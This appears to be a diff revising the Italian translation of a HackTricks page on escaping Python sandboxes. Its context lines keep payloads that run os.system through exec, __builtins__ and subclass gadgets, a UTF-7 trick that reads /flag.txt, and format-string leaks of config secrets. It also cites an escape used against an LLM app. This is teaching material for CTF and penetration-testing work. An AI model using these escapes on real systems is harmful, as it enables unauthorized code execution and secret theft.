@@ -19,7 +19,7 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 **Ottieni la prospettiva di un hacker sulle tue app web, rete e cloud**
 
-**Trova e segnala vulnerabilità critiche ed esploitabili con un reale impatto sul business.** Usa i nostri oltre 20 strumenti personalizzati per mappare la superficie di attacco, trovare problemi di sicurezza che ti permettano di elevare i privilegi e utilizzare exploit automatizzati per raccogliere prove essenziali, trasformando il tuo duro lavoro in report persuasivi.
+**Trova e segnala vulnerabilità critiche ed esploitabili con un reale impatto commerciale.** Usa i nostri oltre 20 strumenti personalizzati per mappare la superficie di attacco, trovare problemi di sicurezza che ti consentono di elevare i privilegi e utilizzare exploit automatizzati per raccogliere prove essenziali, trasformando il tuo duro lavoro in report persuasivi.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
@@ -108,13 +108,13 @@ Puoi scaricare il pacchetto per creare la reverse shell qui. Si prega di notare 
 Questo pacchetto si chiama `Reverse`. Tuttavia, è stato appositamente creato in modo che quando esci dalla reverse shell il resto dell'installazione fallisca, quindi **non lascerai alcun pacchetto python extra installato sul server** quando te ne vai.
 {% endhint %}
 
-## Eval-ing python code
+## Eval-ing codice python
 
 {% hint style="warning" %}
 Nota che exec consente stringhe multilinea e ";", ma eval non lo fa (controlla l'operatore walrus)
 {% endhint %}
 
-Se alcuni caratteri sono vietati, puoi utilizzare la **rappresentazione hex/octal/B64** per **bypassare** la restrizione:
+Se certi caratteri sono vietati, puoi utilizzare la **rappresentazione hex/octal/B64** per **bypassare** la restrizione:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -171,7 +171,7 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-È anche possibile eluderlo utilizzando altre codifiche, ad esempio `raw_unicode_escape` e `unicode_escape`.
+È anche possibile bypassarlo utilizzando altre codifiche, ad esempio `raw_unicode_escape` e `unicode_escape`.
 
 ## Esecuzione di Python senza chiamate
 
@@ -330,7 +330,7 @@ pass
 * [**Funzioni builtins di python2**](https://docs.python.org/2/library/functions.html)
 * [**Funzioni builtins di python3**](https://docs.python.org/3/library/functions.html)
 
-Se puoi accedere all'oggetto **`__builtins__`** puoi importare librerie (nota che potresti anche usare qui un'altra rappresentazione di stringa mostrata nell'ultima sezione):
+Se puoi accedere all'oggetto **`__builtins__`**, puoi importare librerie (nota che potresti anche usare qui un'altra rappresentazione di stringa mostrata nell'ultima sezione):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
@@ -340,7 +340,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 Quando non hai `__builtins__`, non sarai in grado di importare nulla né di leggere o scrivere file poiché **tutte le funzioni globali** (come `open`, `import`, `print`...) **non sono caricate**.\
 Tuttavia, **per impostazione predefinita, python importa molti moduli in memoria**. Questi moduli possono sembrare benigni, ma alcuni di essi **importano anche funzionalità pericolose** al loro interno che possono essere accessibili per ottenere anche **l'esecuzione di codice arbitrario**.
 
-Negli esempi seguenti puoi osservare come **abuse** di alcuni di questi moduli "**benigni**" caricati per **accedere** a **funzionalità** **pericolose** al loro interno.
+Nei seguenti esempi puoi osservare come **abuse** di alcuni di questi moduli "**benigni**" caricati per **accedere** a **funzionalità** **pericolose** al loro interno.
 
 **Python2**
 ```python
@@ -467,7 +467,7 @@ Ad esempio, sapendo che con la libreria **`sys`** è possibile **importare libre
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-Ci sono molti, e **ne abbiamo solo bisogno di uno** per eseguire comandi:
+Ci sono molte, e **ne abbiamo solo bisogno di una** per eseguire comandi:
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
@@ -710,7 +710,7 @@ Nota come puoi **accedere agli attributi** in modo normale con un **punto** come
 
 Nota anche che puoi usare `.__dict__` per enumerare gli elementi di un oggetto `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Altre caratteristiche interessanti delle stringhe di formato sono la possibilità di **eseguire** le **funzioni** **`str`**, **`repr`** e **`ascii`** nell'oggetto indicato aggiungendo **`!s`**, **`!r`**, **`!a`** rispettivamente:
+Altre caratteristiche interessanti delle stringhe di formato è la possibilità di **eseguire** le **funzioni** **`str`**, **`repr`** e **`ascii`** nell'oggetto indicato aggiungendo **`!s`**, **`!r`**, **`!a`** rispettivamente:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -726,10 +726,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Ulteriori esempi** sugli **esempi di stringhe di formato** possono essere trovati in [**https://pyformat.info/**](https://pyformat.info)
+**Ulteriori esempi** su **stringhe di formato** possono essere trovati in [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Controlla anche la seguente pagina per gadget che r**ead informazioni sensibili dagli oggetti interni di Python**:
+Controlla anche la seguente pagina per gadget che r**ead sensitive information from Python internal objects**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -756,7 +756,7 @@ str(x) # Out: clueless
 
 Da [qui](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
-### Dal formato al RCE caricando librerie
+### Da formato a RCE caricando librerie
 
 Secondo il [**TypeMonkey chall di questo writeup**](https://corgi.rip/posts/buckeye-writeups/), è possibile caricare librerie arbitrarie dal disco abusando della vulnerabilità della stringa di formato in python.
 
@@ -964,7 +964,7 @@ return "Nope"
 ```
 ### Creazione dell'oggetto codice
 
-Prima di tutto, dobbiamo sapere **come creare ed eseguire un oggetto codice** in modo da poterne creare uno per eseguire la nostra funzione leak:
+Prima di tutto, dobbiamo sapere **come creare ed eseguire un oggetto codice** in modo da poterne creare uno per eseguire la nostra funzione leaked:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -984,7 +984,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-A seconda della versione di python, i **parametri** di `code_type` potrebbero avere un **ordine diverso**. Il modo migliore per conoscere l'ordine dei parametri nella versione di python che stai eseguendo è eseguire:
+A seconda della versione di python, i **parametri** di `code_type` possono avere un **ordine diverso**. Il modo migliore per conoscere l'ordine dei parametri nella versione di python che stai eseguendo è eseguire:
 ```
 import types
 types.CodeType.__doc__
@@ -1009,10 +1009,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Negli esempi precedenti all'inizio di questo post, puoi vedere **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto in un **un'unica riga** (e potremmo fare lo stesso usando **`exec`**).\
+In precedenti esempi all'inizio di questo post, puoi vedere **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto in un **unica riga** (e potremmo fare lo stesso usando **`exec`**).\
 Comunque, a volte potrebbe essere utile **creare** un **oggetto compilato** su una macchina locale ed eseguirlo sulla **macchina CTF** (ad esempio perché non abbiamo la funzione `compiled` nel CTF).
 
-Ad esempio, compiliamo ed eseguiamo manualmente una funzione che legge _./poc.py_:
+Per esempio, compiliamo ed eseguiamo manualmente una funzione che legge _./poc.py_:
 ```python
 #Locally
 def read():
@@ -1071,7 +1071,7 @@ print("\nYou are a super user\n")
 except AssertionError:
 print(f"\nNot a Super User!!!\n")
 ```
-sarà bypassato
+will be bypassed
 
 ## Riferimenti
 
@@ -1091,8 +1091,8 @@ sarà bypassato
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
 {% hint style="success" %}
-Impara e pratica l'Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica l'Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
